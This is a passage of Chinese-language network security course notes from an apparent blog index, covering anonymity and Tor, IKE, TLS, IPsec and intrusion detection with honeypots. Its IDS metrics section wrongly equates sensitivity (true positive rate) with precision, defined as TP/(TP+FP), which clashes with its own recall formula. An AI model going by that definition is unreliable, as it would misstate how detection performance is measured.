如果付钱， Ai = di XOR 1 如果没有一个人付钱，那么所有宣称的数值计算后应该得出0，否则则为1 同时，如果有人付钱了，一个没有付钱的密码学家是无法得知是其他两人中的谁付的 同样的情况可以运用到多个用户身上，每个用户都生成一个随机的bit发送给左边的邻居，每个人都有两个bits来进行计算 每个人都宣称自己进行XOR计算的结果 只有发送者会多XOR一个想要发送的数据中的bit 这样就可以综合所有的结果并得到0/1也就是message bit 但是现实中很难实现，因为首先需要很大的匿名组，然后还有每个用户都做随机数然后再计算，很复杂 安全性确实很强，就算有很强大的算力也无法得知发送者是谁。 同时也会因为通信channel被干扰而出现错误，同时匿名组中的成员如果撒谎了也会导致通信失败 Onion routing 发送者随机地选择途径路由器的次序 我们假设有一些路由器是诚实的，但是有一些被黑客所控制了 发送者主动的控制路径的长度 发送者将数据根据选择的路径用每个路由器的public key加密好，并内置一个symmetric key来对后续的内容进行加密 同时每个路由器只能获取到前一个router的identity,使其无法溯源 Tor (the onion router)就是这么进行匿名通信的 Set up Onion service sot that it\u0026rsquo;s reachable by clients 发送者首先先与一台路由器交换symmetric session key 然后用这台路由器作为代理与新的路由器交换symmetric session key，不断反复，直到到达目标地址 然后就利用建立的Tor circuit进行通信，每个途径的onion router都会单独加密解密 Location hidden servers Goal: 将服务器部署在Internet上并且告知其他用户可以访问，但是不能让别人知道这台服务器在哪儿和是谁在运行 随处可以访问 不会被审查 能够在DoS attack中存活 找不到物理服务器 https://community.torproject.org/onion-services/overview/ Privacy A privacy policy specifies how data may be used, under which condition, and what obligations this entails. ","date":"2022-05-30T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_10_privacy_and_anonymity/","title":"NSE Week 10: Privacy and anonymity"},{"content":"NSE Week 9: IKE and SSL/TLS IKE (The Internet Key Exchange protocol) IKE不仅仅只是关于密钥，更多的关于SA (security associations): 协议的格式 加密或者哈希的算法 密钥 IKE十分的灵活，比如提供身份认证，并通过多种pre-shared secrets来实现 IKE又十分复杂，有很多的选项可以配置以及很多的子协议 IKE结合了 ISAKMP 的数据包格式，以及 OAKLEY 的协议，这两个东西都基于 Diffie-hellman protocol PFS 如果我们已经能安全的交换YA,YB了，为什么还要套在这个Diffie-Hellman里面用呢？ 主要是为了实现PFS，perfect forward secrecy PFS,perfect forward secrecy 为了确保协议做生成的临时key，session key不会因为用来产生这个session key所用到的key被破解了而导致session key也没破戒 用来加密传输数据的key不能用作产生其他的key，这样就会产生连带效应，一个key被破解了，其所产生的key也会被破解 同样的道理，如果产生当前的key需要通过其他keys来产生，那么那些key也不能用做其他key的产生 也就是说一个key被破解了，只会影响用其所加密的数据，其他都不会收到影响 因此在具体实现的时候的一个小技巧就是，每个session key都是随机产生的，并且在session结束之后就销毁，这样就都不会影响了，同时也会给密码分析带来负担。 IKE protocol IKE可以为通信的双方来建立和维护SA Typical key establishment protocol: 只有一个阶段，就是双方使用 master keys 来进行通信交换信息 Master keys pre-shared secret (symmetric) keys public encryption key (used only for encryption/decryption), 比如互相知道对方的public key，然后加密之后可以由对方的private key来进行解密 public signature key （用来进行验证） IKE则有两个步骤： Phase 1: 通信的双方线协商一个SA，关于使用什么加密或者哈希算法 Phase 2: Phase 1中产生的SA会继续产生 \u0026ldquo;child SAs\u0026quot;来进行加密和验证未来的通信 IKE phase 1 IKE的第一个阶段主要的目的是要建立一个安全的channel来给Phase 2进行通信交流 需要用到的概念有： Cookies：用作初期的身份认证，推荐的实现方法是： 通过一些较快的hash，例如MD5，将UDP的IP source/destination address/ports 以及保存在本地的一个 secret value 进行hash 因为存在一个 secret value ，那么通过将自己生成的cookie发送给对方，再由对方发送回来，就可以进行验证，是否是自己曾经发出的内容 Identifiers, ID: 用来标识通信的双方的身份，可以是： IP address Fully-qualified domain name Certification E-mail address MAC address Authenticators: 用于验证消息的数据 IKE Phase 1 提供两种模式 Main mode 通过6条交换的信息来建立 Initiator(I) and Responder(R) 之间的安全channel 通过互相的配置协商来实现 Identify protection Considerable flexibility Aggressive mode 由于不提供保护因此能够更快的建立 只需要3条信息的交换 没有 提供 Identify protection 只有public-key加密所带来的authentication 根据选用的 authentication 方法的不同，每种模式都拥有4种变化 Pre-shared key Digital signatures 2 public-key variants 我们的重点会放在Main mode上 I会生成Cookie_I 以及ISA_I (ISAKMP SA)其中包含了提出的提议（加密和哈希算法） R在收到之后，会考虑I提出的proposal然后选择使用什么算法：ISA_R,接着返回自己生成的Cookie 以下就是一个例子，I会提出建议，然后由R来选择，因此ISA_I \u0026amp; ISA_R可能相同也可能不同，这将有R来决定 I收到R同意的条约之后，随机选择构建DH所需要的参数 g, p (g is the primitive root of p), X = g^x mod p 接着附上一个nonce，用来防止relay attack，keep freshness R收到I发来的cookie之后，先对自己的C_R进行重新计算并验证 接着计算Y = g^y mod p 最后生成自己nonce N_R 返回给I I收到R的Y之后，就可以用来计算 DH session key了，在此之前还会重新计算并验证自己的cookie C_I 接着会将自己的ID以及 previous data通过约定好的 authenticator 计算好并和ID一起用DH session key进行加密并返回给R R验证了自己的Cookie C_R 之后也会将自己的ID_R以及authentication data用DH session key进行加密后返回给I，I验证了R的ID之后也就完成了phase1 根据不同的authenticator也会有一些变种，但是步骤是不变的 IKE phase 2 IKE phase 2的通信会由之前在phase 1中达成的SA进行保护 IKE phase 2的目的就是利用之前建立的安全的通信，开始交换协商真正需要用在通信中的SAs phase 2也有两种mode Quick mode 直接创造新的SAs (e.g., for ESP or AH) New group mode 用来修改存在的SAs的参数 不产生新的SAs 我们主要关注Quick mode 如果被要求实现PFS，那么quick mode也会再次实现DH exchange 多个quick mode可以用不进行，并且会使用在phase1中用到过的ID 数据的加密会用到phase 1中的数据，用在phase 2中的新key SPI就是用来标识新的SA的 SPI fields k就是DH exchange所生成的session key 协商建立一个SA 生成IPsec key 用作将来ESP or AH 中 我们可以看到，这其实也是一个协商的过程，就是I发起倡议，然后还是由R来决定最终的SA是怎么样的 另一个例子 The second phase of the IKE protocol is done by three message exchanges. For the ﬁrst and second messages I1 and R1, the initiator I and the responder R exchange IPSec SAs (IP SecSAIand IP SecSAR),nonces NI and NR(for replay attack protection), optional D -H values gI and gR, and hashes of these values and message IDs (to prove liveliness), HashI1 and HashR1. After the initiator sends one more hash (HashI2) using both NI and NR and the message ID as the third message, both parties will agree on the IPSec symmetric key for use during ESP or AH encapsulation. 为了更好的保护长久的VPN session, IPsec 提供了定期刷新IKE key以及IPSec keys的机制 IKE key的刷新需要重新跑两个phase 但是刷新IPsec只需要跑phase 2即可 SSL/TLS SSL/TLS是用来保护Transport layer传输层的安全的，通过提供confidentiality and integrity来防止通信被窃听和篡改 目标是实现Confidentiality, integrity，有条件的话也可以实现authentication，通过单（双）向的认证channel来进行安全的通信，由public-key certificate所支持，因为是Transport layer上的安全，因此也可以被应用层的协议所利用，例如HTTP(S), SMTP, IMAP SSL/TLS实现了两种协议 TLS Handshake protocol TLS Handshake protocol 通过初始化或者恢复之前的connection然后搭建一个安全的channel来进行通信 Server certificate: B -\u0026gt; A: certificate(B, K_B) Certificate是由 trusted third party 来进行认证的，包含了B的identity以及B的public key client exchange client certificate (option) A -\u0026gt; B: certificate (A, K_A) {PMS}_K_B client key exchange A - \u0026gt; B: {PMS}_K_B certificate verify (option) A-\u0026gt; B:{hash(message)}{K_A}^-1 PMS: pre-master secret是用来生成新的master key M的，M= PRF(PMS, Na, Nb), where PRF is pseudo-random function Nonce信息可以是在hello信息中被确定的 最重要的就是两条消息就是 Server certificate: B -\u0026gt; A: certificate(B, K_B) client key exchange A - \u0026gt; B: {PMS}_K_B simplest SSL do not provide authentication of sender’s identity (it has options to prove) TLS Record Protocol TLS Record protocol是用来通信交换数据的，主要描述了应用层发出的数据应该如何被压缩，用MAC进行认证以及payload要如何加密 TLS Record Protocol 为每一个TLS connections提供了两种服务 Confidentiality 由TLS Handshake protocol 所定义的密钥可以用来对TLS payload 进行加密 Message Integrity 由TLS Handshake protocol 所定义的共享密钥（public key）可以用来组成MAC (message authentication code)来验证integrity TLS connection and TLS session TLS connection 是一个短时间的概念transient 每一个connection会关联一个TLS session TLS会话 connection是P2P的关系 TLS connection 本质上是一个session内的安全流 a secure stream within a session TLS session TLS session是一个长时间的概念，就算connection中断了，但是session依然存在 其表示client and server之间进行安全通信的关系，协议，是一种类似Security association的东西 TLS session 由TLS Handshake Protocol所创造，由client and security双发协商达成共识 每一个TLS session中都有很多关于安全的参数，可以同时被很多connection共享 ","date":"2022-05-30T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_9_ike_and_ssl_tls/","title":"NSE Week 9: IKE and SSL/TLS"},{"content":"NSE Week 8: IP security Internet security Why we need IP security, what the problems in existing TCP/IP protocols? 他们没有提供authentication或者confidentiality的功能，因此黑客可以sniffing也可以spoofing IPsec IP security (IPsec)通过提供额外的IP header来增强安全，适用于IPv4 or IPv6 通过在IP层实现这个安全措施，可以既保护那些已经在应用层做了安全措施的应用（例如看全邮件系统，SSL，Kerberos），也可以帮助那些没有安全措施的应用进行防护。 IPsec提供了三种安全功能： Authentication: 通过保证通信的双方的身份都经过了认证 Confidentiality: 通过对payload数据的加密来防范未经授权的查看 Key management: 安全的keys交换 Implementation Operating systems: 对主机终端用户提供保护 Security gateways: firewalls or routers, 比如实现VPN Application 应用 保护分公司内部之间的通信：公司可以在LAN或者WAN搭建VPN来减少对于private networks的依赖 保护经过Internet的远程访问：终端用户可以利用IP sec协议来通过ISP来向公司网络发起关城访问请求 保护组织之间的通信 加强电子商务的安全性：通过对网络流量的加密来增强安全性 使用场景 IPSec既可以安装在组织的网络设备上，例如router or firewall作为内外网的gate来对进出的数据进行加密和解密，也可以安装在主机终端上来保护其对外网的通信。 Benefits 将IPSec部署在firewall \u0026amp; router上的时候，可以减轻公司企业对于安全措施的繁重负担，只需要全部交给这些网络设备统一处理就好了 并且firewall上的IPsec可以有效的防御绕过，因为外界来的流量都需要使用IPSec并且无处可逃 IPSec位于传输层下面，因此对于应用来说是透明的 不需要修改软件 对用户也是透明的，不过一般来说用户也不会察觉到IPSec的存在，一切都是默默进行的 有需要的话也可以私用保护单独的用户 IPsec standard IPsec 提供三种protocols来完成不同的任务 Authentication Header (AH)：保护IP数据包的integrity and authenticity（但是不包括 confidentiality） Encapsulating Security Payload (ESP)：保护confidentiality，也可以选择性的保护integrity Internet Key Exchange Protocol (IKE): 提供密钥管理 IPsec services IPsec可以通过选择实现不同的protocol来实现不同的services IPsec policy IPsec policy主要是通过直接与IP packet进行互动，而具体的policy内容则需要访问两个数据库： Security association database (SAD) Security policy database (SPD) Security association database (SAD) Security association (SA) SA是一个SAD中的关键 其是一个 单向 的概念，以为着一对通信的双方的单向行为需要单独的SA进行定义 其中每一个SA由三个参数进行标识： Security Parameters Index (SPI): 方便使用的系统来标识SA IP Destination Address: 之前我们提到的“单向”就体现在此，通过destination address来进行标识 Security Protocol Identifier: 标识选择AH还是ESP 所有SA的定义都会放在一个指定的Security Association Database中 AH ESP Keys Key lifetimes Lifetime of security association Protocol mode (tunnel or transport) Security policy database (SPD) SPD主要定义了那些IP traffic将与那些SA进行配合使用（或者不使用），通常来说使用entry来进行记录： a subset of IP traffic : an SA for that traffic 在复杂的环境中，也可以是多个的entries对应一个SA或者是多个SA需要应用在一个SPD entry上 IP traffic processing IPsec是一个包一个包的执行过来的 每个出站的IP packet在发出去之前都需要用IPsec进行处理 每一个入站的包在收到之后都需要被IPsec进行处理，然后才能传达的更高层进行下一步处理(TCP/UDP) Outbound packets 收到一个outbound packet之后，IPsec会从SPD中匹配entries 如果没有匹配上，那么就会直接被丢弃并产生错误信息 如果匹配上了，那么就会决定packet的去处，可能是“丢弃”，也可能直接绕过IPsec（就是我们之前说的没有SA） 如果policy是PROTECT的话，就去SAD中寻找匹配的entry，如果没有找到的话， IKE 就会被调用来创造一个新的SA以及合适的密钥 如果SAD中又匹配的entry，那么就会按照SA进行处理，最终发送出去 Inbound Packets IPsec首先查看IP packet的header来决定着是一个不安全的IP packet还是已经有IPsec保护的（ESP or AH headers） 如果IP packet是不安全的，那么IPsec就会从SPD中寻找匹配的entry，如果第一个匹配到的policy是BYPASS，那么就直接发到TCP/UDP去处理了，如果是其他的，例如PROTECT or DISCARD或者没有匹配到，通通都丢弃，因为是不安全的 如果是安全的IPSec包，那么就直接去SAD中找对应的entries以及SA，接着如果匹配到了，那就执行对应的操作(AH/ESP)，没有匹配到的话就直接丢弃 Authentication Header (AH) 这一章中，我们具体来看一下AH的组成结构 AH作为一个额外的header，其夹在IP \u0026amp; TCP header之间，提供足够的信息来识别SA，其只提供 Integrity 的保障 Security Parameters Index (SPI): 方便使用的系统来标识SA IP Destination Address: 之前我们提到的“单向”就体现在此，通过destination address来进行标识 Security Protocol Identifier: 标识选择AH还是ESP Sequence number field会从1开始不断增加， Anti-relay service relay attack就是攻击者通过重复使用可以通过认证的数据包来进行绕过 假设我们使用这样一个SA 发送者： 将sequence number计数器设置为0 每一个packet的sequence number进行递增 如果达到上限（2^32 - 1）,就结束当前这个SA，并重新开启一个SA和新的密钥进行加密 接收者，设置一个 window size W (default = 64) 如果接收到一个数据包的sequence number落到window size中，并且 Integrity 检查也没有问题，就标记为valid 如果接收到一个数据包落在窗口右边（未来窗口的数据包），同时Integrity 检查也没有问题，标记为valid，同时窗口向右滑动 如果接收到的数据包落在窗口左边（以前的数据包）或者认证失败，那么packet会被丢弃，同时记录该事件 通过sequence number就可以有效判断数据包是否是以前的被攻击者用在现在的数据流上 AH modes 原始的TCP segment Transport mode\nAH插入在IP header与TCP header之间 MAC (Message Authentication Code)会对整一个包进行认证 提供端对端的IPsec系统保护 Tunnel mode\n整个原始数据包都会被进行验证，会有一个新的 outer IP header inner(original) IP header中携带最终的 source/destination address new outer header 同样也会收到保护，但是包含的是例如firewall/security gateway的地址 Encapsulating Security Payload (ESP) ESP可以提供confidentiality, data origin authentication, connectionless integrity, an anti-replay service, and traffic flow confidentiality. ESP header 指定了加密的算法以及authentication策略 ESP mode Transport Mode ESP\nTransport Mode ESP 一般端对端的安全通信上，可以对IP数据包进行加密和认证。 对于IPv4数据包，IPsec一旦介入： ESP header会插入IP header和TCP header之间 同时ESP trailer (including Padding, Pad length, and Next Header fields) 将会被添加在IP packet的最后 如果添加了认证的选项，那么在最后还会加上 ESP Authentication Data, 这时对前面所有内容的加密 这里补充一下Padding的作用，主要是当加密算法需要规定数量的bytes的时候，由于原来的内容不够bytes数，就需要添加一些内容来凑齐，这些就会放在ESP trailer里面 对于IPv6的数据包： 在IPv6中，ESP会被当作是端对端的payload，因此无法被主动的路由，因此就需要附带上具体的路由在header上面 hop-by-hop路由会被添加在Original IP header与ESP header之间 总的来说Transport mode的操作主要是： 传输的数据再加上ESP trailer中padding的数据和整一个Transport-layers segment (e.g., TCP segment)一起被加密并将原本的明文data换成是经过加密的数据。是否开启认证可以自由选择 数据包被路由到destination，所有经过的路由器都会处理IP header中的内容，但是不需要也不能处理加密的密文 destination node根据ESP header中的SPI选择SA来解密，并恢复原本的Transport-layers segment (e.g., TCP segment). Transport mode的好处在于提供了统一的confidentiality，而不需要每一个application还需要实现自己的加密. 但是有一个缺点就是，路上的路由器还是可以对流量进行分析，这点无法阻止。 Tunnel mode ESP\n如下图就是Tunnel mode的一个使用场景，每个公司的内网通过tunnel mode 建立的VPN进行互相的通信，而完成不和Internet的路由上的任何其他主机或者设备进行交互。 那么为了避免沿路的路由器对通信进行流量分析，Tunnel mode ESP将会加密整一个IP packet，然后将 ESP header 加在 Original IP header 前面 由于Original IP header中包含目标地址以及routing的信息，因此一旦全部被加密之后，途径的路由器就无法处理这些数据包。因此就需要一个新的IP header，其中包含必要的信息，但是不能被进行流量分析 同时，为了保护内网的主机，ESP会提供内网的边界设备，例如firewall or security gateway 我们来看一个具体的例子，看看一个外网的主机是如何通过Tunnel mode ESP来与内网主机进行通信的 构建一个安全的 outer IP packet: 首先构造一个original IP packet其中包含了内网用户的信息 然后添加一个 ESP header 接着加上 ESP trailer 来padding上合适的信息用于加密算法，接着将原本的data以及 ESP trailer 加密，并在末尾添加上认证的信息 ESP authentication 最后再最前面加上一个新的 new IP header （如果是IPv6的话还要加上 hop-by-hop options ） 接着这个 outer packet 将会被路由到目标的防火墙，途径的路由器只能处理最外面的新的IP header以及扩展的headers，但是无法处理中间加密的信息 Destination firewall也会先处理外部的几个headers，之后便会根据 ESP header中的 SPI 信息查找对应的SA来进行解密，最终在内网中进行路由，传递到指定的主机上 Combining security associations 一般来说，一个SA只会实现AH or ESP其中一个protocol,无法都实现，但是我们之前提到过有一种用法是一个数据流对应很对个SAs来组成IPsec services, 这种很多SAs一起使用的就叫做 security association bundle refers 一般来说，综合的使用方法有两种： Transport adjacency 将多种安全协议运用在用一种IP packet上而不挑用隧道 Iterated tunneling: 将多层的安全协议运用在IP tunneling上 Case study Case 1\n端对端的安全（通过交换密钥） 一般为内网的主机访问外网的服务器提供保护 可能的组合 AH in transport mode ESP in transport mode ESP followed by AH in transport model (an ESP SA inside an AH SA) Any of the above inside an AH or ESP in tunnel mode Case 2\n只提供gateway (routers, firewall, etc.)之间的安全通信，主机不需要实现IPSec，因此在security gateway之后的网络中不提供任何保护 VPN就是其中一种应用 同时采用IP tunneling，可以用以下方式实现： AH ESP ESP加上authentication选项（AH是没有的） Case 3\nCase3可以被看作是Case 1 加上Case2，即在Case2的IP tunneling所提供的 security gateways之间的保护的基础上，又加上了case1中的点对点的保护措施，通过提供端对端的SAs组合来实现内网中的保护 Case 4\n使用场景一般是外网的主机需要访问在security gateway中所保护的内网中的主机 远程主机会与security gateway之间建立 IP tunneling 同时security gateway也会与内网的主机建立SAs的保护 ","date":"2022-05-29T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_8_ip_security/","title":"NSE Week 8: IP security"},{"content":"NSE Week 7: Intrusion detection and prevention IDPS IDPS vs firewall Why we need Intrusion detection since we already have firewalls? IDS的主要目的是检测并报告任何网络中的入侵尝试 IDS是建立在firewall之后的，还记得我们之前在firewall中提到的三层内网保护机制吗，IDS就作为街道巡逻来识别可疑的入侵者 Firewall主要是将外敌抵御在城墙之外，而IDS就负责抓住潜伏进来的内鬼 Three classes of intruders Masquerader 伪装者 Masquerader是一个外部人员，没有任何权限来使用计算机，但是却通过外部手段进行渗透，操控了合法用户的账户，可以被看作是一个outsider Misfeasor 渎职者 Misfeasor是一个合法的用户，但是却做了超出其权限活着规定的事情，可以被看作是一个insider Clanderstine user 秘密用户 Clanderstine user通过获取获取系统的高级权限，进而破坏系统的防御措施，可以是insider活着outsider IDPS Definitions Intrusion 未经授权的对于计算机资源的访问 Intrusion detection 检测对于系统活着网络未经授权的访问 Intrusion detection system (IDS) 就像是网络中的杀毒软件 组成：sensors, alerts; 检测如前以及报告检测到的如前 Intrusion prevention system (IPS) IPS 就是一个IDS并且自动对检测到的入侵做出反馈的系统： 关闭入侵者的网络连接 尝试反溯源入侵者 对抗攻击 IDS与IPS配合使用，一般来说IDS在IPS的后面辅助其更好的加强安全 Approaches to intrusion detection 那我们具体应该如何识别一次入侵呢？ 最基础的方法就是密切监控所有合法用户的行为，一旦出现异常的行为，就很有可能是一次入侵 但是入侵行为却和普通的行为有很大的重叠 因此检测很有可能会出现问题，我们用machine learning中曾经用过的概念来解释入侵检测 前提：在这里，一次positive就表示，IDS识别了一次intrusion False positive 就是表示一个授权的用户的正常行为被错误的认为是了入侵，检测条件较为宽松的IDS更容易检测到更多的入侵，但同时也会遭致很多的false alarms, completeness False negative 就表示一次入侵没有被识别为入侵，检测条件如果较为单一，那么相对而言检测到的入侵会更加准确，但是却会遗漏很多的入侵，soundness Reputation detection: - 观察主机是否与曾经行为不良的用户进行通信 Anomaly-based detection: - 首先定义系统内正常的行为，然后检测那些不正常的行为，一般使用机器学习来进行训练和识别 Misuse-based detection: - 预先定义不良的行为作为模版，然后用这些模版进行匹配检测 Reputation based 主要目的是为了观察主机是否与曾经行为不良的用户进行通信 那么如何来判断这些不良的用户呢？ 一半了是基于OSINT，开源的情报以及一些私有的黑名单来进行筛选识别 Malware Domain List (MDL) Google Safe Browsing Spamhaus Block Lists PhishTank Misuse based 预先定义不良的行为作为模版，然后用这些模版进行匹配检测 也被称为 signature detection,通过识别几个特定的signature来进行匹配检测 依赖于恶意行为模型models of malicious behaviour 同样使用开源情报：Indicators of Compromise (IoC) \u0026amp; Indicators of Attacks (IoA) IoC/IoA/signature 就如同firewall中的blacklist一样，用来匹配那些恶意行为 Indicators of Compromise (IoCs)\nIoC一般是作为取证数据，从日志或者文件中提取出来的恶意行为特诊 可以被分为host-based或者是network-based 甚至可以是很复杂的shellcode IoC主要关注点在已经发生过的入侵，从日志，文件等信息中来识别 Indicators of Attacks (IoAs) : - IoAs就关注于正在发生的入侵 Misuse-based detection: pros and cons\nMisuse-based detection的例子： (traffic source.ip = destination.ip) and (source.port=destination.port) 这就是一个很典型的异常行为的匹配与判断 Advantages : 1. 较少的false alarms 2. 每次的alerts都会有对应的解释（匹配了什么模型） 3. 速度很快 4. 不惧怕evasion，因为是预先设定好的，不会更改 Disadvantage : - 只能检测已知的攻击（APT，zero-day就束手无策了） - 需要不断更新换代 \u0026lt;br/\u0026gt; - 对于over-stimulation attacks来说是错误的 \u0026lt;br/\u0026gt; Anomaly based 首先定义系统内正常的行为，然后检测那些不正常的行为，一般使用机器学习来进行训练和识别 需要先收集一段时间的数据来定义正常的行为 然后将统计测试的结果应用到检测用户的行为来判断是否合法 阈（yù）值检测 Threshold detection：对各种时间的发生频率进行定义，查看是否出现异常 基于账户 Profile based：为不同用户的行为进行记录统计，来观察每个用户行为的变化 侧重于过去的行为，然后检测重大的变化 可以被认为是白名单检测，默认不信任所有的行为 Statistical test\nMean and standard deviation 平均值和标准差 通过一段时间的数据来进行计算 可以运用到很多参数上 不适合单独在IDs上使用 Multivariate calculation 用来决定几个变量之前的关系（例如处理时间，数据占用，登录频率等） 通过对于变量关系的分析可以更好的进行分类 Markov process Estimates transition probabilities among various states Efficient in describing protocol run Time series model 根据时间次序进行计算 可以用来检测一些活动进行的太快或者太慢 Pros and Cons\nAdvantages : 1. 可以检测那些从来没遇到过的攻击 2. 不需要主动去更新 Disadvantage : 1. 很难进行配置以及需脸 2. 定义异常的行为为恶意的有时候也不完全准确 3. 会产生很多的 false alarms 4. 消耗大量的资源 Other IDS classification 根据时间Timeliness: Real-time（实时在线运行） Non real-time (离线模式，定期进行) 反应措施 Response type: Passive (被动的，只有检测到了才会发出警告) Active (主动封锁恶意的流量) State-dependency Stateful analysis（结合上下文的） Stateless analysis System type: 软件 硬件 Topology 拓扑范围类型 Host IDS (HIDS) Network IDS (NIDS) Distributed IDS (DIDS) 观察和检测整一个网络利用多种检测模式 HIDS/NIDS/DIDS Host IDS (HIDS)\n专注于本机的数据 NIC网卡需要处于non-promiscuous mode,即不会接受与自己无关的数据包，进而缩小检测范围 检测的范围: Logs 日志 System calls 系统指令 Host activities 用户行为 只关注本地服务 Network IDS (NIDS)\n专注于网络内的所有主机 NIC开放promiscuous mode，接受所有的数据包 通常会部署在： choke points（firewall） DMZ Internal network Traditional deployment : - IDS设备连接在trunk points (e.g., firewall)上，来检测所有的网络流量，检测攻击，但没有防御手段 Inline deployment :\nIDS设备直接与设备相连接，可以进行检测和防御，例如IPS Distributed IDS (DIDS)\n利用多个sensors（HIDS，NIDS）来收集数据，然后再汇总到中心的管理器上 管理员综合分析所有的事件来进行分析判断 会部署在专用的外部网络上，例如VPN 我们在CFC中就曾经遇见过类似的内容 Security Information and Event Management就可以统一收集并管理所有的数据 Host会在后台运行监控系统，然后将收集到的数据发送到中央的管理服务器上（外部网络，VPN） 中央的管理服务器收集所有的事件报告（从内网中），然后综合分析来入侵检测分析 IDS是如何工作的\nInput information 信息输入 Application-specific information 应用数据 Host-specific information: 本地日志，系统文件变化，系统命令调用 Network specific information: 数据流量 Intrusion detection policies Known bad: blacklist 预定义的攻击模型 Reputation-based detection Signature-based/rule-based/misuse-based detection Known good: 报告任何异常情况 Anomaly-based detection 入侵报告 passive response (检测报告) active response (主动封锁连接) Alert data: IDS alerts Log data: complete host logs Statistical data: network stats Session data: 5-tuple flows Packet string data: e.g., HTTP headers Full packet capture: PCAP files Packet capture: tcpdump, wireshark Session data: netflow, IPFIX (Internet Protocol Flow Information Export) Session string: URLsnarf Logs: syslog Measuring performance True positive: 检测到的入侵是真的 False positive: 检测到的入侵是假的 True negative: 检测到的合法行为是真的 False negative: 检测到的合法行为是假的，其实是入侵 Sensitivity (True positive rate, probability of detection): measures the proportion of positives that are correctly identified Specificity (True negative rate): measures the proportion of negatives that are correctly identified Sensitivity = True positive rate = Precision = TP / (TP + FP) it reflects the machine learning algorithm’s performance on “How many times you are right?”, TP + FP indicates the total sample are labeled by ML as malware (positive) Recall = TP / (TP + FN), it reflects “How many malware found by you”, TP + FN means all the actual malware within the dataset Specificity = True negative rate = TN / (TN + FP) Base-rate fallacy 基率谬误 指的是人们在考虑事件的概率的时候往往没有考虑全部的信息，而是选择那些个性化的信息而草率的出结论，以偏概全 A \u0026amp; B 是不同的事件 P(A|B) 是一个条件概率，顾名思义，是在一定条件下，某一些时间发生的概率：当B发生的情况下，A发生的概率 P(B|A) 是一个条件概率：当A发生的情况下，B发生的概率 P(A) \u0026amp; P(B) 是A \u0026amp; B单独各自发生的概率 Bayes\u0026rsquo; theorem 根据贝叶斯定理，P(A|B) * P(B) = P(B|A) * P(A)就是A与B同时发生的概率 可以有效的综合多个概率，从而得出一个更为可靠的综合概率 我们假设： I 为入侵行为 ¬I 为非入侵行为 A 为出现入侵警告事件 ¬A 没有出现入侵警告事件 True positive rate or detection rate: P(A|I)，在入侵确实发生的情况下，发出警告的概率 False positive rate of false alarm rate: P(A|¬I)，在没有发生入侵的情况下，发出警告的概率 False negative rate: P(¬A|I) = 1 - P(A|I)，在入侵确实发生的情况下，没有发出警告的概率 True negative rate: P(¬A|¬I) = 1 - P(A|¬I)，在没有发生入侵的情况下，没有发出警告的概率 P(I|A): 在发出入侵警告事件的情况下，真的有入侵事件的概率 P(¬I|¬A): 在没有入侵警告事件的情况下，确实没有入侵的概率 我们假设一个网络管理员在过去的一年中，在每10,000个活动中能检测到1个真实的入侵，继续利用上面的事件，也就是： P(I) = 1/10000 同时这位网络管理对自己的工作十分骄傲，因为他从所有入侵中亲自发现了被检测系统遗漏的5%的入侵，也就是： P(¬A|I) = 5% 但管理又对检测系统非常的不满，因为其不仅会遗漏入侵，还有3%的入侵警报事件是误报，也就是 P(A|¬I) = 3% 如果我们要计算一个警告真的是入侵的概率，也就是P(I|A)，就可以套用上面的公式 P(I|A) = P(I) * P(A|I) / P(I) * P(A|I) + P(¬I) * P(A|¬I)= ((0.0001 * 0.95) / ((0.0001 * 0.95)+(0.9999*0.03)) = 0.00315 \u0026ndash;\u0026gt; 0.32% Honeypots Honeypots as a deception technique Why we need honeypots, since we already have firewalls and IDPS? Firewall和IDPS更多的是拦截和阻断攻击者的攻击，但是如果我们想更多的了解attacker，从而提前掌握潜在的威胁，那么我们就需要用到Honeypots，蜜罐，用来引诱攻击者暴露更多的信息： Honeypot 蜜罐 是一个陷阱其实放置了检测以及反制手段来获取那些未经许可的访问的信息 同时也作为诱饵，使攻击者原理重要的系统 学习未知的攻击 学习入侵者的行动模式 从而更好的预测和抵抗未来的攻击 蜜罐没有实际的生产价值，其知识为了防范入侵 里面充斥着一些伪装的信息，来引诱攻击者进行入侵 因此合法的用户不会与其通信，那么所有的通信只会是扫描，入侵或者给农机 进而我们可以收集攻击者的活动 并部署一些看起来有价值的信息来诱导攻击者长时间的驻留的系统内，以便我们更好的手机信息 尽量要让攻击者成功入侵，这样才能使他们驻留，并留下痕迹 同时也不能太容易入侵，最好能让攻击者感到有挑战性 Honeypots deployment and classifications Deployment\n蜜罐一般会被部署在DMZ上，当然也可以在边界路由器之外（指外网），或者内网也可以。 进而部署虚拟的环境，同时营造出尽可能真实的系统环境，通过深度的监控来手机攻击者的信息 Classification\n根据目的 : - Production honeypots 蜜罐产品 - 为企业的网络环境提供蜜罐产品 - 更容易部署和使用 - 在易用和信息收集量之间做取舍 - Research honeypots 研究型蜜罐 - 提供更全面的攻击信息 - 更难部署，因为考虑到没有那么专业的开发力量来优化 - 通过更加全面地研究攻击，进而找到更好的解决方法 根据互动的程度 : - 提供较少互动的蜜罐 - 只模拟运行一小组服务和应用 - 不能被获取所有权限 - 攻击者的互动被限制 - 通常是用在产品型蜜罐上 - 优点：风险低，容易部署 - 缺点：收集到的信息较少，因为互动少 - 提供较多互动的蜜罐 \u0026lt;br/\u0026gt; - 使用真实的操作系统和应用 \u0026lt;br/\u0026gt; - 攻击者可以获得所有网络和系统的访问 \u0026lt;br/\u0026gt; - 通常用在研究型蜜罐上 \u0026lt;br/\u0026gt; - 优点：可以获取更多的信息 \u0026lt;br/\u0026gt; - 缺点：较高的风险，并且维护的成本更高 \u0026lt;br/\u0026gt; 根据实现的方法 : - Physical honeypot 物理蜜罐 - 网络上连接的真实设备 - Virtual honeypot 虚拟蜜罐 - 模拟主机进行互动 - 一个主机可以同时维护和运行多个虚拟蜜罐 - 通常可以提供更多的互动，因为虚拟环境更为安全 根据互动的方向 : - Server honeypots 服务器蜜罐，开启服务 - Client honeypots 客户端蜜罐，连接服务器的服务 \u0026lt;br/\u0026gt; Honeypots phases 最好的方法： 较高的堡垒化网络 每一个数据包都进行保存，便于分析学习 Phases： Data control Data capture, 捕捉attacker所产生的各种data Data analysis，分析这些data，学习攻击者的互动 Data control\n蜜罐通过与攻击者进行通信（via protocols）来诱导他们做出行动，留下踪迹 Bandwidth throttling 宽带限流 由ISP主动给网络服务降速，从而增加访问蜜罐消耗的时间成本，减少了对其他用户造成危害的时间 Data 